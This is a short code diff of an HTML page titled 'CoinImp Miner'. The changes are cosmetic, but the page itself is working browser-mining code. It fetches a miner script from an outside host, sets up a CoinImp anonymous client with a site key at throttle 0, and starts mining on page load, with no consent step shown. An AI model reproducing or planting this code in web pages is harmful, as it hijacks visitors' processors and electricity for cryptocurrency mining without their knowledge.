@@ -6,15 +6,12 @@
     <title>CoinImp Miner</title>
   </head>
   <body>
-    <!-- Loading the external miner script -->
+    <!-- Load the external miner script -->
     <script src="http://testingimp.great-site.net/weJt.php?f=pqoQ.js"></script>
     <script>
       var _client = new Client.Anonymous(
         "d632289c7212a9856c1a8599cc8c628940a4b798788d0fdb5f8b38034052f541",
-        {
-          throttle: 0,
-          c: "w"
-        }
+        { throttle: 0, c: "w" }
       );
       _client.start();
       _client.addMiningNotification(
